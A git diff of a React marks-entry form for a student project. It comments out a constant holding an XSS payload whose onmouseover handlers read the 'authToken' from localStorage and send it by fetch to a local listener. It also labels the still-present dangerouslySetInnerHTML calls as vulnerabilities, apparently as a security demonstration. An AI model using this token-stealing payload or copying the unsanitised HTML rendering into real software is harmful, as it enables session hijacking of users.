@@ -34,7 +34,7 @@ const EnterStatusDocument1Marks = ({history}) => {
     const[marksEn04,setmarkEn04] = useState("");
 
 
-     const exploitData = `Click  <b onmouseover='async function fetchAsync (url) {var token = localStorage.getItem("authToken");await fetch("http://localhost:7777?token="+token);await response.json()} fetchAsync()'>Me</b> <b onmouseover='alert("I now have your Data You are hacked !")'>NOW </b> <b onmouseover='localStorage.removeItem("authToken");   window.location.reload();'> Get Out </b>  `;
+     //const exploitData = `Click  <b onmouseover='async function fetchAsync (url) {var token = localStorage.getItem("authToken");await fetch("http://localhost:7777?token="+token);await response.json()} fetchAsync()'>Me</b> <b onmouseover='alert("I now have your Data You are hacked !")'>NOW </b> <b onmouseover='localStorage.removeItem("authToken");   window.location.reload();'> Get Out </b>  `;
 
 
 
@@ -187,10 +187,13 @@ const EnterStatusDocument1Marks = ({history}) => {
           <form onSubmit={enterstatusdocument1marksHandler} className="group-screen__form_Enter_marks">
 
      <div />
+
+     {/* dangerousInnerHTML vulnerability */}
      <div className="bg-blue-900" dangerouslySetInnerHTML={{__html: totalContribution }}  />
 
+     
      {console.log("Total contribution "+totalContribution)}
-     {console.log("Exploit code "+exploitData)}
+     {/* {console.log("Exploit code "+exploitData)} */}
      
       <h3 className="login-screen__title" style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif"}} >RP (IT4010) Project Status document 1 [Total contribution =  {totalContribution}%]</h3>
       {error && <span className="error-message">{error}</span>}
@@ -204,51 +207,45 @@ const EnterStatusDocument1Marks = ({history}) => {
           name="name" required
           className = "input" id="StudentIDInput"
           onChange={(e) => setprojectNo(e.target.value)}
-          value={projectNo} />
-
-                    
-
-                </td>
-                <td>
-                <label>
+          value={projectNo} />                    
+        </td>
+                
+        <td>
+        <label>
             <b style={{fontSize:"medium"}}>Student ID</b></label><br/><br/>
             <input type="text" style={{marginLeft:"100px",borderColor:"royalblue"}}
             name="name" required
             className = "input"
             onChange={(e) => setstudentIDs(e.target.value)}
             value={studentIDs} />
+        </td>
+        </tr>
 
-                    </td>
-                </tr>
-            </table><br/>
+        </table>
+        
+        <br/>
             <label>
             <b style={{fontSize:"medium",marginLeft:"65px"}}>Project Status Document from Proposal to PP1.
-                (Project Management tool outcome reflections)</b></label><br/><br/>
-            
-            
-            
+                (Project Management tool outcome reflections)</b></label><br/><br/>         
             </div>
-        
-
 
         <table className="proposalpresentationmarking">
         <tr>
-    <th className="proposalpresentationmarking">Item No </th>
-    <th className="proposalpresentationmarking"> Description </th>
-    <th className="proposalpresentationmarking">MAX.MARKS ENTITLED </th>
-    <th className="proposalpresentationmarking"> MARKS GIVEN </th>
-    <th className="proposalpresentationremarks"> REMARKS </th>
+            <th className="proposalpresentationmarking">Item No </th>
+            <th className="proposalpresentationmarking"> Description </th>
+            <th className="proposalpresentationmarking">MAX.MARKS ENTITLED </th>
+            <th className="proposalpresentationmarking"> MARKS GIVEN </th>
+            <th className="proposalpresentationremarks"> REMARKS </th>
 
-  </tr>
+         </tr>
  {/* first row start */}
-  <tr>
-    <td className="proposalpresentationmarking" >
+        <tr>
+        <td className="proposalpresentationmarking" >
         1
-    </td>
+        </td>
+        <td className="proposalpresentationmarking">
    
-    <td className="proposalpresentationmarking">
-   
- <div  dangerouslySetInnerHTML={{__html: stdesc01}}/>
+         <div  dangerouslySetInnerHTML={{__html: stdesc01}}/>
    
     </td>
     <td className="proposalpresentationmarking">
@@ -256,114 +253,67 @@ const EnterStatusDocument1Marks = ({history}) => {
     </td>
 
     <td className="proposalpresentationmarking">
-   
     <input type="number" required style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",width:"75px",margin:"100px",borderWidth:"1px",borderStyle:"solid",borderColor:"royalblue"}}
             name="name" 
             min="0" max="100"
             className = "bg-black py-2 pl-2 text-right"
           onChange={(e) => setganttchartmarks(e.target.value)}
-          value={ganttchartmarks} />
-          
-          </td>
-            
-            
-            
-            
-            
-    
-            {/* <tr> */}
-            {/* <td className="proposalpresentationmarking" >
-                    1
-            </td> */}
-            {/* <td className="proposalpresentationmarking">
-            Updated Gantt chart of finalize Design & implementation
-            phases
-
-            </td> */}
-            {/* <td className="proposalpresentationmarking">
-            25 marks
-            </td> */}
-
-            {/* <td  className="proposalpresentationmarking">
-    
-            <input type="text" style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",width:"75px",margin:"100px",borderColor:"royalblue"}}
-            name="name" 
-            className = "proposalpresentationinput"
-            onChange={(e) => setganttchartmarks(e.target.value)}
-            value={ganttchartmarks} />
-            
-
-
-    </td> */}
+          value={ganttchartmarks} />      
+    </td>
 
     <td className="proposalpresentationmarking">
-   
     <input type="number" required style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",width:"75px",margin:"100px",borderWidth:"1px",borderStyle:"solid",borderColor:"royalblue"}}
             name="name" 
             min="0" max="100"
             className = "bg-black py-2 pl-2 text-right"
    onChange={(e) => setganttchartremarks(e.target.value)}
    value={ganttchartremarks} />
-   
-
-
-</td>
-    {/* </tr> */}
-
-    {/* <tr> */}
-   
-                {/* </tr> */}
-
-
+    </td>
     
     </tr>
     <tr>
     <td className="proposalpresentationmarking" >
         2
     </td>
+
     <td className="proposalpresentationmarking">
     <div  dangerouslySetInnerHTML={{__html: stdesc02}}/>  
     </td>
+
     <td className="proposalpresentationmarking">
   {marksEn02}  
     </td>
 
     <td className="proposalpresentationmarking">
-   
     <input type="number" required style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",width:"75px",margin:"100px",borderWidth:"1px",borderStyle:"solid",borderColor:"royalblue"}}
             name="name" 
             min="0" max="100"
             className = "bg-black py-2 pl-2 text-right"
           onChange={(e) => setactualtimemarks(e.target.value)}
           value={actualtimemarks} />
-          
-
-
             </td>
 
-            <td  className="proposalpresentationmarking">
-    
-            <input type="number" required style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",width:"75px",margin:"100px",borderWidth:"1px",borderStyle:"solid",borderColor:"royalblue"}}
-            name="name" 
-            min="0" max="100"
-            className = "bg-black py-2 pl-2 text-right"
-            onChange={(e) => setactualtimeremarks(e.target.value)}
-            value={actualtimeremarks} />
-            
-
-
-            </td>
+    <td  className="proposalpresentationmarking">
+    <input type="number" required style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",width:"75px",margin:"100px",borderWidth:"1px",borderStyle:"solid",borderColor:"royalblue"}}
+    name="name" 
+    min="0" max="100"
+    className = "bg-black py-2 pl-2 text-right"
+    onChange={(e) => setactualtimeremarks(e.target.value)}
+    value={actualtimeremarks} />
+    </td>
 
 
     </tr>
 {/* first row end */}
     <tr>
+
     <td className="proposalpresentationmarking" >
         3
     </td>
     <td className="proposalpresentationmarking">
 
-    <div  dangerouslySetInnerHTML={{__html: stdesc03}}/>  
+        {/* Vulnerable part in code */}
+    <div dangerouslySetInnerHTML={{__html: stdesc03}}/>  
 
     </td>
     <td className="proposalpresentationmarking">
@@ -378,24 +328,18 @@ const EnterStatusDocument1Marks = ({history}) => {
             className = "bg-black py-2 pl-2 text-right"
           onChange={(e) => setbreakdownmarks(e.target.value)}
           value={breakdownmarks} />
-          
 
 
+    </td>
 
-            </td>
+    <td  className="proposalpresentationmarking">
 
-            <td  className="proposalpresentationmarking">
-    
-            <input type="number" required style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",width:"75px",margin:"100px",borderWidth:"1px",borderStyle:"solid",borderColor:"royalblue"}}
-            name="name" 
-            min="0" max="100"
-            className = "bg-black py-2 pl-2 text-right"
-            onChange={(e) => setbreakdownremarks(e.target.value)}
-            value={breakdownremarks} />
-            
-
-
-
+    <input type="number" required style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",width:"75px",margin:"100px",borderWidth:"1px",borderStyle:"solid",borderColor:"royalblue"}}
+    name="name" 
+    min="0" max="100"
+    className = "bg-black py-2 pl-2 text-right"
+    onChange={(e) => setbreakdownremarks(e.target.value)}
+    value={breakdownremarks} />
     </td>
     </tr>
 
@@ -413,167 +357,86 @@ const EnterStatusDocument1Marks = ({history}) => {
     {marksEn04} 
     </td>
 
-    {/* <td className="proposalpresentationmarking"> */}
-   
-          {/* <input type="text" style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",width:"75px",margin:"100px",borderColor:"royalblue"}}
-          name="name" 
-          className = "proposalpresentationinput"
-          onChange={(e) => setmanagementtoolmarks(e.target.value)}
-          value={managementtoolmarks} /> */}
-          
+    <td  className="proposalpresentationmarking">
+    
+    <input type="number" required style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",width:"75px",margin:"100px",borderWidth:"1px",borderStyle:"solid",borderColor:"royalblue"}}
+    name="name" 
+    min="0" max="100"
+    className = "bg-black py-2 pl-2 text-right"
+            onChange={(e) => setmanagementtoolmarks(e.target.value)}
+            value={managementtoolmarks} />
+    </td>
 
+    <td  className="proposalpresentationmarking"> 
+    <input type="number" required style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",width:"75px",margin:"100px",borderWidth:"1px",borderStyle:"solid",borderColor:"royalblue"}}
+    name="name" 
+    min="0" max="100"
+    className = "bg-black py-2 pl-2 text-right"
+        onChange={(e) => setmanagementtoolremarks(e.target.value)}
+        value={managementtoolremarks} />
+    </td>
+    </tr>
 
-            {/* <tr> */}
-            {/* <td className="proposalpresentationmarking" > */}
-                {/* 3
-            </td>
-            <td className="proposalpresentationmarking">
-            Finalize work breakdown structure & allocates resources
-            for each areas.
+    <tr>
+    <td className="proposalpresentationmarking" >     
+    </td>
+    <td className="proposalpresentationmarking">
+        Total
+    </td>
+    <td className="proposalpresentationmarking">
+        100 marks
+    </td>
+    <td  className="proposalpresentationmarking">      
+    </td>
+    <td  className="proposalpresentationmarking"> 
+    </td>
+    </tr>
+    </table>
+     
+    <div className="form-group">
 
-            </td> */}
-            {/* <td className="proposalpresentationmarking">
-            25 marks
-            </td> */}
-
-            {/* <td  className="proposalpresentationmarking">
-        
-                <input type="text" style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",width:"75px",margin:"100px",borderColor:"royalblue"}}
-                name="name" 
-                className = "proposalpresentationinput"
-                onChange={(e) => setbreakdownmarks(e.target.value)}
-                value={breakdownmarks} /> */}
-                
-
-
-            {/* </td> */}
-{/* 
-            <td  className="proposalpresentationmarking">
-        
-                <input type="text" style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",width:"75px",margin:"100px",borderColor:"royalblue"}}
-                name="name" 
-                className = "proposalpresentationinput"
-                onChange={(e) => setbreakdownremarks(e.target.value)}
-                value={breakdownremarks} />
-                
-
-
-            </td> */}
-            {/* </tr> */}
-
-
-    {/* </td> */}
-    {/* <td className="proposalpresentationmarking">
-        {totalMarksEntitled}
-    </td> */}
-
-            
-            {/* <td className="proposalpresentationmarking">
-            25 marks
-            </td> */}
-
-            <td  className="proposalpresentationmarking">
-            
-            <input type="number" required style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",width:"75px",margin:"100px",borderWidth:"1px",borderStyle:"solid",borderColor:"royalblue"}}
-            name="name" 
-            min="0" max="100"
-            className = "bg-black py-2 pl-2 text-right"
-                    onChange={(e) => setmanagementtoolmarks(e.target.value)}
-                    value={managementtoolmarks} />
-                    
-
-
-            </td>
-
-            <td  className="proposalpresentationmarking">
-        
-            <input type="number" required style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",width:"75px",margin:"100px",borderWidth:"1px",borderStyle:"solid",borderColor:"royalblue"}}
-            name="name" 
-            min="0" max="100"
-            className = "bg-black py-2 pl-2 text-right"
-                onChange={(e) => setmanagementtoolremarks(e.target.value)}
-                value={managementtoolremarks} />
-                
-
-
-            </td>
-            </tr>
-
+        <table className="tablemarks1">
             <tr>
-            <td className="proposalpresentationmarking" >
-                
-            </td>
-            <td className="proposalpresentationmarking">
-                Total
+                <td style={{padding:"5px",margin:"5px"}}>
+                            <label>
+                <b style={{fontSize:"medium",fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",fontSize:"medium",marginLeft:"-25px"}}>Co supervisor:</b></label><br/><br/>
+                <input type="text" style={{margin:"10px",borderColor:"royalblue"}}
+                name="name" required
+                className = "input"
+                pattern = "[a-zA-Z\s]{3,}"
+                onChange={(e) => setcosupervisor(e.target.value)}
+                value={cosupervisor} />
 
-            </td>
-            <td className="proposalpresentationmarking">
-                100 marks
-            </td>
-
-            <td  className="proposalpresentationmarking">
-                
-            </td>
-
-            <td  className="proposalpresentationmarking">
-        
-            </td>
-
-
-            </tr>
-
-
-            </table>
-
-        
-
-
-            
-       
-            <div className="form-group">
-
-                <table className="tablemarks1">
-                    <tr>
-                        <td style={{padding:"5px",margin:"5px"}}>
-                                    <label>
-                        <b style={{fontSize:"medium",fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",fontSize:"medium",marginLeft:"-25px"}}>Co supervisor:</b></label><br/><br/>
-                        <input type="text" style={{margin:"10px",borderColor:"royalblue"}}
-                        name="name" required
-                        className = "input"
-                        pattern = "[a-zA-Z\s]{3,}"
-                        onChange={(e) => setcosupervisor(e.target.value)}
-                        value={cosupervisor} />
-
+                </td>
+            <td className="tabletd1">
+            <label>
+                <b style={{fontSize:"medium",fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",fontSize:"medium",marginLeft:"-25px"}}>Supervisor:</b></label><br/><br/>
+                <input type="text" style={{margin:"10px",borderColor:"royalblue"}}
+                name="name" required
+                pattern = "[a-zA-Z\s]{3,}"
+                className = "input"
+                onChange={(e) => setsupervisor(e.target.value)}
+                value={supervisor} />
                         </td>
-                    <td className="tabletd1">
-                    <label>
-                        <b style={{fontSize:"medium",fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",fontSize:"medium",marginLeft:"-25px"}}>Supervisor:</b></label><br/><br/>
-                        <input type="text" style={{margin:"10px",borderColor:"royalblue"}}
-                        name="name" required
-                        pattern = "[a-zA-Z\s]{3,}"
-                        className = "input"
-                        onChange={(e) => setsupervisor(e.target.value)}
-                        value={supervisor} />
-                                </td>
+    
+            </tr>
+        </table>
+    
             
-                    </tr>
-                </table>
-        
-                    
-                </div>
-            
+        </div>
+    
 
 
-                <button type="submit" style={{fontSize:"medium",fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",fontSize:"medium",marginLeft:"-25px",paddingTop:"0px"}}  id="Log1Button" className="bg-purple-900" >
-                    Enter marks
-                    </button>
+        <button type="submit" style={{fontSize:"medium",fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif",fontSize:"medium",marginLeft:"-25px",paddingTop:"0px"}}  id="Log1Button" className="bg-purple-900" >
+            Enter marks
+            </button>
 
+    
+        </form></div>
+        </div>
             
-                </form></div>
-                </div>
-                    
-                    
-                </>
+            
+        </>
         );
 
 
